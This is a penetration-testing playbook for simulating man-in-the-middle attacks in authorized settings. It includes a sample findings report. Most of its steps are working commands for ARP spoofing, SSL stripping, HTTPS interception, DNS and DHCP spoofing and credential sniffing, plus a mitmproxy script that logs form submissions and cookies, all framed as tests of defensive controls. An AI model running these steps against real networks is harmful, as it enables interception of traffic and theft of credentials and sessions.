---
name: conducting-man-in-the-middle-attack-simulation
description: >
  Simulates man-in-the-middle attacks using Ettercap, mitmproxy, and Bettercap in
  authorized environments to intercept, analyze, and modify network traffic for
  testing encryption enforcement, certificate validation, and detection capabilities.
domain: cybersecurity
subdomain: network-security
tags: [network-security, mitm, bettercap, ettercap, mitmproxy]
version: "1.0"
author: mahipal
license: Apache-2.0
---
# Conducting Man-in-the-Middle Attack Simulation

## When to Use

- Testing whether applications properly validate TLS certificates and enforce encrypted communications
- Demonstrating the risk of cleartext protocols (HTTP, FTP, Telnet, SMTP) to organization stakeholders
- Validating that HSTS, certificate pinning, and other anti-MITM controls are correctly implemented
- Assessing network detection capabilities for ARP spoofing, DHCP spoofing, and DNS spoofing attacks
- Training incident response teams to identify and respond to MITM attack indicators

**Do not use** on production networks without explicit written authorization and a rollback plan, against systems you do not own or have permission to test, or for intercepting communications of uninvolved third parties.

## Prerequisites

- Written authorization specifying in-scope targets and approved MITM techniques
- Bettercap 2.x, Ettercap, and mitmproxy installed on the attacker machine
- Layer 2 access to the same network segment as target hosts
- Custom CA certificate for TLS interception testing (generated specifically for the engagement)
- Wireshark or tshark for capturing and verifying intercepted traffic
- Isolated lab environment or approved production test window with rollback procedures

## Workflow

### Step 1: Set Up the Attack Environment

```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1
sudo sysctl -w net.ipv6.conf.all.forwarding=1

# Disable ICMP redirects
sudo sysctl -w net.ipv4.conf.all.send_redirects=0

# Generate a CA certificate for TLS interception
openssl genrsa -out mitm-ca.key 4096
openssl req -new -x509 -days 30 -key mitm-ca.key -out mitm-ca.crt \
  -subj "/CN=MITM Test CA/O=Security Assessment/C=US"

# Discover hosts on the target network
sudo bettercap -iface eth0 -eval "net.probe on; sleep 10; net.show; quit"
```

### Step 2: Execute ARP-Based MITM with Bettercap

```bash
# Start Bettercap with interactive mode
sudo bettercap -iface eth0

# Enable network probing to discover hosts
> net.probe on

# Display discovered hosts
> net.show

# Set target (victim: 192.168.1.50, gateway: 192.168.1.1)
> set arp.spoof.targets 192.168.1.50
> set arp.spoof.fullduplex true

# Start ARP spoofing
> arp.spoof on

# Enable HTTP proxy for traffic inspection
> set http.proxy.sslstrip true
> http.proxy on

# Enable HTTPS proxy with certificate interception
> set https.proxy.certificate mitm-ca.crt
> set https.proxy.key mitm-ca.key
> https.proxy on

# Enable DNS spoofing for specific domains
> set dns.spoof.domains example.com,*.example.com
> set dns.spoof.address 192.168.1.99
> dns.spoof on

# Enable credential sniffer
> set net.sniff.verbose true
> set net.sniff.filter "tcp port 80 or tcp port 21 or tcp port 110"
> net.sniff on
```

### Step 3: Intercept HTTP/HTTPS Traffic with mitmproxy

```bash
# Start mitmproxy as transparent proxy
sudo mitmproxy --mode transparent --set confdir=~/.mitmproxy \
  --set ssl_insecure=true -w mitm_capture.flow

# Configure iptables to redirect traffic through mitmproxy
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Use mitmproxy scripting for automated credential extraction
cat > extract_creds.py << 'PYEOF'
"""mitmproxy script to extract credentials from intercepted traffic."""
from mitmproxy import http
import json

def request(flow: http.HTTPFlow):
    if flow.request.method == "POST":
        content_type = flow.request.headers.get("content-type", "")
        if "form" in content_type or "json" in content_type:
            with open("captured_forms.log", "a") as f:
                f.write(f"URL: {flow.request.pretty_url}\n")
                f.write(f"Data: {flow.request.get_text()}\n")
                f.write("---\n")

def response(flow: http.HTTPFlow):
    # Log authentication cookies
    if "set-cookie" in flow.response.headers:
        with open("captured_cookies.log", "a") as f:
            f.write(f"URL: {flow.request.pretty_url}\n")
            f.write(f"Cookie: {flow.response.headers['set-cookie']}\n")
            f.write("---\n")
PYEOF

sudo mitmproxy --mode transparent -s extract_creds.py -w mitm_capture.flow
```

### Step 4: Perform DNS Spoofing and DHCP Attacks

```bash
# DNS spoofing with Ettercap
sudo tee /etc/ettercap/etter.dns << 'EOF'
# Redirect target domain to attacker's web server
example.com      A   192.168.1.99
*.example.com    A   192.168.1.99
www.example.com  A   192.168.1.99
EOF

sudo ettercap -T -q -i eth0 -M arp:remote -P dns_spoof /192.168.1.50// /192.168.1.1//

# DHCP spoofing with Bettercap (offer rogue DHCP with attacker as gateway)
sudo bettercap -iface eth0
> set dhcp6.spoof.domains example.com
> dhcp6.spoof on

# Set up a phishing page on the attacker machine
sudo python3 -m http.server 80 --directory /var/www/phishing/
```

### Step 5: Validate Detection and Test Controls

```bash
# Verify certificate pinning is working on the target application
# If the app rejects the MITM CA, certificate pinning is effective
# Check the target machine for certificate errors

# Test HSTS enforcement
# If browser refuses HTTP connection after initial HTTPS, HSTS is working
curl -v -k -L http://example.com 2>&1 | grep -i "strict-transport-security"

# Verify IDS detection of ARP spoofing
# Check Snort/Suricata alerts for ARP anomalies
grep -i "arp" /var/log/snort/alert_fast.txt

# Check if switch detected the attack (DAI logs)
# On Cisco switch: show ip arp inspection log

# Test network monitoring tools
# Verify that Zeek generated appropriate notices
cat /opt/zeek/logs/current/notice.log | zeek-cut note msg

# Capture evidence of successful/failed interception
tshark -i eth0 -f "host 192.168.1.50" -w mitm_evidence.pcapng -a duration:300
```

### Step 6: Clean Up and Document Results

```bash
# Stop all MITM attacks
# In Bettercap:
> arp.spoof off
> http.proxy off
> https.proxy off
> dns.spoof off
> quit

# Restore IP forwarding
sudo sysctl -w net.ipv4.ip_forward=0

# Remove iptables rules
sudo iptables -t nat -F PREROUTING

# Verify ARP tables are restored on target hosts
# The target should re-learn correct MAC addresses via normal ARP

# Force ARP cache refresh (from target machine)
# arp -d 192.168.1.1 && ping -c 1 192.168.1.1

# Remove test CA certificate from any systems where it was installed
# Remove capture files containing sensitive data per engagement agreement

# Generate documentation
echo "MITM Simulation completed at $(date)" >> mitm_report.txt
sha256sum mitm_capture.flow mitm_evidence.pcapng >> mitm_report.txt
```

## Key Concepts

| Term | Definition |
|------|------------|
| **Man-in-the-Middle (MITM)** | Attack where the adversary secretly intercepts and potentially alters communication between two parties who believe they are communicating directly |
| **SSL Stripping** | Downgrade attack that converts HTTPS connections to HTTP by intercepting the initial HTTP request before the TLS upgrade, bypassing encryption |
| **HSTS (HTTP Strict Transport Security)** | Browser security policy that forces HTTPS connections and prevents SSL stripping by caching the requirement for encrypted connections |
| **Certificate Pinning** | Application security control that validates server certificates against a pre-configured set of trusted certificates, detecting MITM proxy certificates |
| **ARP Cache Poisoning** | Layer 2 attack technique that corrupts the ARP cache of target hosts to redirect traffic through the attacker's machine |
| **Transparent Proxy** | Proxy that intercepts traffic without requiring client-side configuration, typically using iptables REDIRECT rules to capture traffic destined for standard ports |

## Tools & Systems

- **Bettercap 2.x**: Swiss-army knife for network attacks supporting ARP/DNS/DHCP spoofing, HTTP/HTTPS proxying, and credential sniffing with a modular architecture
- **mitmproxy**: Interactive TLS-capable proxy for intercepting, inspecting, and modifying HTTP/HTTPS traffic with Python scripting support
- **Ettercap**: Legacy MITM tool supporting ARP spoofing, DNS spoofing, and plugin-based traffic manipulation
- **sslstrip**: Tool that implements SSL stripping attacks by proxying HTTP-to-HTTPS redirects and serving downgraded HTTP versions
- **Wireshark**: Packet analyzer for verifying traffic interception and capturing evidence of successful or failed MITM attempts

## Common Scenarios

### Scenario: Testing HTTPS Enforcement on an Internal Web Application

**Context**: A development team claims their internal web application enforces HTTPS with HSTS and certificate pinning. The security team needs to verify these controls during an authorized assessment. The application runs on 10.10.20.50 and is accessed by workstations on the 10.10.1.0/24 VLAN.

**Approach**:
1. Set up Bettercap on the same VLAN and ARP-spoof a test workstation (10.10.1.100)
2. Enable SSL stripping via Bettercap's HTTP proxy to test whether the application can be downgraded to HTTP
3. Enable HTTPS interception with a test CA certificate to test certificate validation
4. Attempt to access the application from the test workstation and observe whether the browser or application rejects the connection
5. Verify that HSTS headers are present and have appropriate max-age values
6. Document that the thick client does not implement certificate pinning (accepts the MITM CA) while the web browser properly rejects it due to HSTS preload
7. Recommend implementing certificate pinning in the thick client application

**Pitfalls**:
- Forgetting to enable IP forwarding, causing a denial of service instead of transparent interception
- Testing SSL stripping on an application with HSTS preloaded in the browser and concluding HSTS works, when a fresh browser instance might be vulnerable
- Not cleaning up ARP spoofing after testing, causing intermittent connectivity issues for the target
- Running mitmproxy without the transparent mode flag, requiring manual proxy configuration that changes the test conditions

## Output Format

```
## MITM Simulation Report

**Test ID**: MITM-2024-001
**Date**: 2024-03-15 14:00-16:00 UTC
**Target Application**: https://app.internal.corp (10.10.20.50)
**Test Workstation**: 10.10.1.100
**Attacker Machine**: 10.10.1.99

### Control Validation Results

| Control | Status | Details |
|---------|--------|---------|
| HTTPS Redirect | PASS | HTTP requests redirect to HTTPS with 301 |
| HSTS Header | PASS | max-age=31536000; includeSubDomains; preload |
| SSL Stripping (Browser) | BLOCKED | HSTS prevents downgrade in Chrome/Firefox |
| SSL Stripping (Thick Client) | VULNERABLE | Client follows HTTP redirect without HSTS |
| Cert Pinning (Browser) | N/A | Standard CA validation only |
| Cert Pinning (Thick Client) | VULNERABLE | Accepts MITM CA without validation |
| IDS Detection | PASS | Snort generated ARP spoof alert in 12 seconds |

### Recommendations
1. Implement certificate pinning in the thick client (high priority)
2. Add HSTS preload list submission for the domain
3. Enable DAI on access-layer switches for Layer 2 protection
4. Configure application to reject connections from non-pinned certificates
```
